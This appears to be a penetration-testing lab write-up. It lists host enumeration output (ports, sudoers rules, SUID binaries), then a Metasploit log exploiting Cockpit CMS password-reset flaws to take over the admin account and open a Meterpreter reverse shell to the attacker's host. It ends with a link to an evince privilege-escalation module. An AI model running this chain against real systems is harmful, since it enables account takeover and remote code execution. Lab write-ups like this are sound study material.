# Workspace

## 信息收集

```bash
Detected ss and lsof, executing related commands...
Port: 53, PID: 637
—> Command: /lib/systemd/systemd-resolved 
Port: 22, PID: 869
—> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
Port: 33060, PID: 902
—> Command: /usr/sbin/mysqld 
Port: 3306, PID: 902
—> Command: /usr/sbin/mysqld 

## ———————————————————————————— ##

Nginx is not installed.

## ———————————————————————————— ##

Detected apache, analyzing its configuration...

Unique Hosts:


## ———————————————————————————— ##

Checking /etc/sudoers (active configurations only):
  Defaults      env_reset
  Defaults      mail_badpass
  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
  root  ALL=(ALL:ALL) ALL
  %admin ALL=(ALL) ALL
  %sudo ALL=(ALL:ALL) ALL
  webdev ALL=(ALL) NOPASSWD: /usr/bin/evince /opt/comic_books/*
———
Finding SUID files:
/snap/snapd/12883/usr/lib/snapd/snap-confine
/snap/snapd/12704/usr/lib/snapd/snap-confine
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core18/2074/bin/mount
/snap/core18/2074/bin/ping
/snap/core18/2074/bin/su
/snap/core18/2074/bin/umount
/snap/core18/2074/usr/bin/chfn
/snap/core18/2074/usr/bin/chsh
/snap/core18/2074/usr/bin/gpasswd
/snap/core18/2074/usr/bin/newgrp
/snap/core18/2074/usr/bin/passwd
/snap/core18/2074/usr/bin/sudo
/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2074/usr/lib/openssh/ssh-keysign
/snap/core20/1081/usr/bin/chfn
/snap/core20/1081/usr/bin/chsh
/snap/core20/1081/usr/bin/gpasswd
/snap/core20/1081/usr/bin/mount
/snap/core20/1081/usr/bin/newgrp
/snap/core20/1081/usr/bin/passwd
/snap/core20/1081/usr/bin/su
/snap/core20/1081/usr/bin/sudo
/snap/core20/1081/usr/bin/umount
/snap/core20/1081/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1081/usr/lib/openssh/ssh-keysign
/snap/core20/1026/usr/bin/chfn
/snap/core20/1026/usr/bin/chsh
/snap/core20/1026/usr/bin/gpasswd
/snap/core20/1026/usr/bin/mount
/snap/core20/1026/usr/bin/newgrp
/snap/core20/1026/usr/bin/passwd
/snap/core20/1026/usr/bin/su
/snap/core20/1026/usr/bin/sudo
/snap/core20/1026/usr/bin/umount
/snap/core20/1026/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1026/usr/lib/openssh/ssh-keysign
/usr/local/bin/ktsuss
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
———
Finding files with special capabilities:
  /snap/core20/1081/usr/bin/ping = cap_net_raw+ep
  /snap/core20/1026/usr/bin/ping = cap_net_raw+ep
  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
  /usr/bin/ping = cap_net_raw+ep
  /usr/bin/mtr-packet = cap_net_raw+ep
  /usr/bin/traceroute6.iputils = cap_net_raw+ep
———
```

## Port 9000 Cockpit CMS

直接上 msf

```bash
msf6 exploit(multi/http/cockpit_cms_rce) > exploit 
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin"]
[-] Exploit aborted due to failure: bad-config: 10.10.110.102:9000 - User to exploit required
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/cockpit_cms_rce) > set user admin
user => admin
msf6 exploit(multi/http/cockpit_cms_rce) > exploit 
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin"]
[*] Obtaining reset tokens (CVE-2020-35847)
[*] Attempting to generate tokens
[*] Obtaining reset tokens (CVE-2020-35847)
[+]   Found tokens: ["rp-dcb379e6eea4cde8dc266fabbae0b69067fd13be63261"]
[*] Checking token: rp-dcb379e6eea4cde8dc266fabbae0b69067fd13be63261
[*] Obtaining user info
[*]   user: admin
[*]   name: Admin
[*]   email: admin@yourdomain.de
[*]   active: true
[*]   group: admin
[*]   password: $2y$10$UjEHclDQTixCinRTQiE7IuIre5rNfs.t245Wh7L3obdzWM0Az4pZ2
[*]   i18n: en
[*]   _created: 1631196553
[*]   _modified: 1631196553
[*]   _id: 613a158938323733e40002be
[*]   _reset_token: rp-dcb379e6eea4cde8dc266fabbae0b69067fd13be63261
[*]   md5email: a11eea8bf873a483db461bb169beccec
[+] Changing password to SRUxX4DTbT
[+] Password update successful
[*] Attempting login
[+] Valid cookie for admin: e83850b838cf3b3a451998465d54c0f1=8vms2e3fs388r86teptevk5me6;
[*] Attempting RCE
[*] Sending stage (40004 bytes) to 10.10.110.102
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.110.102:39682) at 2025-04-14 21:55:27 +0800
```

## 提权

[metasploit-framework/documentation/modules/exploit/multi/fileformat/evince\_cbt\_cmd\_injection.md at master · rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/evince_cbt_cmd_injection.md)
